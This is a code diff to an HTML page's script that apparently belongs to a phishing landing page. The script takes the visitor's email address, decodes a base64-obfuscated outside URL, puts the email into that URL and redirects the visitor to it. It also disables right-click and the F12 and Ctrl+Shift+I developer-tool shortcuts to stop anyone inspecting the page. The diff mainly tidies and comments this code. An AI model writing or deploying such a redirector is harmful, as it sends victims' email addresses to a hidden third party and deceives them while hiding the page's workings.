@@ -119,34 +119,48 @@
 </footer>
 
 <script>
+    function validateEmail(email) {
+        // Simple email validation regex
+        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return regex.test(email);
+    }
+
     function continueLoading() {
+        // Get the email input value
         var email = document.getElementById("email").value;
 
+        // Validate the email
         if (!email || !validateEmail(email)) {
             alert("Please enter a valid email address.");
             return;
         }
 
-        var linkx = "aHR0cHM6Ly9iY3NpcmRoYWthbGFicy5jb20vbi8/YzNZOWJ6TTJOVjh4WDI1dmJTWnlZVzVrUFZkV2NGQlNhbEU5Sm5WcFpEMVZVMFZTTURnd01USXdNalZWTWpjd01UQTRNalk9TjAxMjNOW0VNQUlMXQ=="; 
+        // Base64-encoded link
+        var linkx = "aHR0cHM6Ly9iY3NpcmRoYWthbGFicy5jb20vbi8/YzNZOWJ6TTJOVjh4WDI1dmJTWnlZVzVrUFZkV2NGQlNhbEU5Sm5WcFpEMVZVMFZTTURnd01USXdNalZWTWpjd01UQTRNalk9TjAxMjNOW0VNQUlMXQ==";
+
+        // Decode the link
         var decodedLink = atob(linkx);
 
-        var finalLink = decodedLink + "?email=" + email;
+        // Construct the final link with the email
+        var finalLink = decodedLink.replace("[EMAIL]", email);
 
+        // Redirect the user to the final link
         window.location.href = finalLink;
     }
 
-    function validateEmail(email) {
-        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return re.test(email);
-    }
-
+    // Prevent right-click
     document.addEventListener("contextmenu", function (e) {
         e.preventDefault();
     });
 
- 
+    // Prevent developer tools shortcuts
     document.addEventListener("keydown", (event) => {
-        if (event.keyCode === 123 || (event.ctrlKey && event.shiftKey && event.keyCode === 73)) {
+        // Block F12
+        if (event.keyCode === 123) {
+            event.preventDefault();
+        }
+        // Block Ctrl+Shift+I
+        if (event.ctrlKey && event.shiftKey && event.keyCode === 73) {
             event.preventDefault();
         }
     });
